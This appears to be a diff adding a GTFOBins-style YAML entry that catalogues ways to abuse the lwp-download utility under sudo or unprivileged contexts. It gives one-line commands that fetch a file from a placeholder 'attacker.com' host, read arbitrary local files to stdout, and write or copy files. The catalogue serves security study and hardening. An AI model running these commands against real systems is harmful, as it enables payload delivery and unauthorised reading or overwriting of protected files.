@@ -1,0 +1,31 @@
+---
+functions:
+  download:
+  - code: |-
+      lwp-download http://attacker.com/path/to/input-file /path/to/output-file
+    comment: |-
+      The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.
+    contexts:
+      sudo:
+      unprivileged:
+  file-read:
+  - code: |-
+      lwp-download file:///path/to/input-file /dev/stdout
+    contexts:
+      sudo:
+      unprivileged:
+  file-write:
+  - code: |-
+      echo DATA >/path/to/temp-file
+      lwp-download file:///path/to/temp-file /path/to/output-file
+    contexts:
+      sudo:
+      unprivileged:
+  - code: |-
+      lwp-download file:///path/to/input-file /path/to/output-file
+    comment: |-
+      This actually copies a file to a destination.
+    contexts:
+      sudo:
+      unprivileged:
+...
